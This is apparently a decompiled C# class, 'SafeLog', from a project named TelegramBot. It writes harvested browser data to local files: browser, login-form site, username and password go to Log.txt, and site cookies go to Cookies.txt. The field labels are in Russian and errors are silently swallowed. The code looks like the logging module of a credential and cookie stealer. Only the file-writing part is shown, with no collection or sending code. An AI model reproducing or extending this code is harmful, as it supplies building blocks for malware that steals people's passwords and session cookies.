using System;
using System.IO;

namespace TelegramBot
{
	// Token: 0x020000EE RID: 238
	internal class SafeLog
	{
		// Token: 0x06000328 RID: 808 RVA: 0x00025CF0 File Offset: 0x00023EF0
		public static void Combine(string br, string url, string login, string pass)
		{
			try
			{
				File.AppendAllText("Log.txt", string.Concat(new string[]
				{
					"\n=============================================\n\n  Браузер: ",
					br,
					" \n  Сайт с формой: ",
					url,
					" \n  Логин:  ",
					login,
					" \n  Пароль: ",
					pass,
					" \r\n"
				}));
			}
			catch
			{
			}
		}

		// Token: 0x06000329 RID: 809 RVA: 0x00025D60 File Offset: 0x00023F60
		public static void CombineCookies(string url, string first, string second)
		{
			try
			{
				File.AppendAllText("Cookies.txt", string.Concat(new string[]
				{
					"\n",
					url,
					"  |  ",
					first,
					" : ",
					second,
					"\n\n"
				}));
			}
			catch
			{
			}
		}
	}
}
